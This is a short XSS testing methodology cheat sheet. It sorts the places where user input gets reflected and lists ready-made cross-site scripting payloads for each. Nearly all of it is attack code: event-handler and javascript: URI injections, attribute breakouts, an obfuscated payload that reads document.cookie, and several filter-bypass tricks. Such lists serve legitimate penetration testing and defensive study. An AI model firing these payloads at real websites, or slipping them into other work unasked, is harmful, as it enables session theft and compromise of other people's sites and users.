# XSS Testing Methodology

## 1. Initial Check

### Check where user input is reflected in the response:
- If it reflects **inside HTML tags**
- If it reflects **inside attributes (e.g., href, src)**
- If it reflects **outside quotes or without encoding**

---

## 2. Reflected in HTML Tags (`testtttttt"<>`)

### Try the following payloads:

#### General Payloads (in parameters):
```html
<img src=1 onerror="Function('ale'+'rt(document.cookie)')()">
<iframe src="javascript:prompt(1)">
<svg><animate onbegin=prompt(1) attributeName=x></svg>
<img src=x onerror=prompt(1)>
<video><source onerror=prompt(1)></video>
<body onresize=prompt(1)>
<details open ontoggle=prompt(1)>
```

#### Input Fields:
```html
<svg/onload=alert(document.domain)>
VULN><svg/onload=self[`alert`](document.domain)>
"><svg onload=prompt(1)>
</script><script>prompt(1)</script>
<script>eval('prompt(1)')</script>
<details open ontoggle=prompt(1)>
```

---

## 3. Reflected in Attributes (e.g., href, src)

### Math and SVG based:
```html
<math><a xlink:href="javascript:prompt(1)">X</a></math>
```

### When `"` is not encoded:
```html
" onclick="alert('XSS')" x="
" onmouseover="prompt(1)" x="
```

### When input reflects in href tag:
Example: `<a href="input">test</a>`

Payload:
```html
javascript:alert(1)
```

### Without quotes encoded in href or iframe:
Example: `<a href="https://poe.com/input">https://poe.com>input</a>`

Payloads:
```html
" onclick="alert('XSS')" x="
" onmouseover="prompt(1)" x="
' onclick='alert("XSS")' x='
```

---

## 4. `javascript:` URI Scenarios

### Basic:
```html
<a href="javascript:alert(1)">Click me</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><input type="submit"></form>
<button formaction="javascript:alert(1)">Click</button>
<input type="submit" formaction="javascript:alert(1)">
<area shape="rect" coords="34,44,270,350" href="javascript:alert(1)">
<body onload=alert(1)>
```

### Bypass Techniques:
```js
javascript:alert`1`
javascript://%0aalert(1)
javascript:/**/%0aalert()
javascript:/*-*/alert(1)//  
javascr\nipt:%0Aalert(1)
javascript://https://whitelisted.com/?z=%0Aalert(1)
```
